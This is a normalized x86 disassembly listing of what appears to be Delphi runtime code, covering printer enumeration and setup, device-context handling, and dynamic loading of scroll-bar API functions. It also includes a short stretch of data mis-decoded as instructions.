call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42d3e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42d502
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d509
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_42d510
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_424618
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42d980
push eax
mov eax esi
call sub_42d998
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_404464
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_424618
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x8 ]
call sub_42d1b0
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_424618
sub_42d510
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_42d575
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d57c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x8 ]
call sub_42d1b0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_42d1b0
jmp r-xdata
sub_42d580
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42d510
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_42d5b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42d980
push eax
mov eax ebx
call sub_42d998
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_404464
mov edx eax
mov eax edi
call sub_408bf0
mov eax [ esi + 0x4 ]
call sub_404464
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_408bf0
mov eax [ esi + 0xc ]
call sub_404464
mov edx eax
mov eax [ ebp + 0xc ]
call sub_408bf0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42d620
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_42d65c
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42d893
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42d510
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42de14
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_42d620
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_42d3e4
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42d998
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d248
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_4092bc
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_40419c
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d89a
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403fc8
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_42d2a8
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_42d620
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_42d8a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42d8fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42d980
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
movsx eax [ eax + 0x36 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d902
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_42d1b0
sub_42d908
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d972
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42d510
mov eax ebx
call sub_42d980
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_42d3e4
mov eax [ ebx + 0x24 ]
mov [ eax + 0x36 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d979
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_42d1b0
sub_42d998
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dbc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42db84
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4027c4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42db73
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403a8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dbce
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403fc8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4027e4
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42d17c
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d248
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_40419c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d248
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_4092bc
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42d17c
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42dbd8
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ddb5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_408034
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42dd75
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42d17c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4027e4
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42d998
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40d22c
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x41c ]
call sub_42d1b0
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_404464
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x8 ]
call sub_404464
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42d65c
call sub_403a8c
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_40419c
mov edx [ ebp - 0x420 ]
pop eax
call sub_4082d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ddbc
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403fc8
retn
sub_42ddd8
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d788
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403254
inc edi
dec ebx
jne r-xdata
sub_42de40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42de71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42de78
retn
mov eax [ rw-data ]
call sub_403254
sub_42de84
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42deb8
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42dee0
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42e162
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e189
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e190
retn
sub_42e1a5
loope r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
loope r-xdata
test al 0x34
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
inc edx
add [ edx + 0x42 ] dh
add [ esi ] cl
push esp
push ebx
jns r-xdata
loop r-xdata
add [ eax + eax ] al
add [ eax ] al
inc eax
adc [ eax ] eax
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x1e ] dh
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x54 ] si
xor al [ eax ]
mov eax 0xe80042e2
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x42 ] bl
add [ eax + eax ] bl
add [ eax ] al
movsb [ edi ] [ esi ]
loope r-xdata
cmp ch 0xff
mov eax esi
test bl bl
je r-xdata
add ah dh
loop r-xdata
lea eax [ eax ]
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + ebx * 8 + 0x29e80f74 ] 0x53
std
jmp [ edi + ecx * 4 + 0x5 ]
add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
mov eax esi
call sub_403244
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42e278
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e2b8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42e310
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e335
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e33c
retn
sub_42e348
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42e300
xor eax eax
push ebp
push sub_42e4ff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e506
mov eax [ rw-data ]
call sub_42e308
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42e508
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42e300
xor eax eax
push ebp
push sub_42e8bb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8c2
mov eax [ rw-data ]
call sub_42e308
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
